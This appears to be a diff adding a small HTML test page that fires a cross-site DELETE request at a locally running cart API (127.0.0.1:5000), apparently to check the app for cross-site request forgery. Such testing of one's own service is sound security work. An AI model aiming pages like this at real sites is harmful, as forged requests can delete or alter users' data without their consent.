@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Test - Delete Item</title>
+    <script>
+        function deleteItem() {
+            const itemId = document.getElementById('itemId').value; // Get the item ID from the input box
+            if (!itemId) {
+                alert('Please enter the item ID');
+                return;
+            }
+
+            const xhr = new XMLHttpRequest();
+            xhr.open('DELETE', `http://127.0.0.1:5000/cart/${itemId}`, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    alert(`Item ID ${itemId} has been successfully deleted`);
+                } else {
+                    alert('Failed to delete the item');
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('Request failed:', xhr.statusText);
+                alert('Request failed, please check the console');
+            };
+
+            xhr.send();
+        }
+    </script>
+</head>
+<body>
+    <h1>CSRF Attack Test - Delete Item</h1>
+    <input type="number" id="itemId" placeholder="Enter item ID" />
+    <button onclick="deleteItem()">Delete Item</button>
+</body>
+</html>
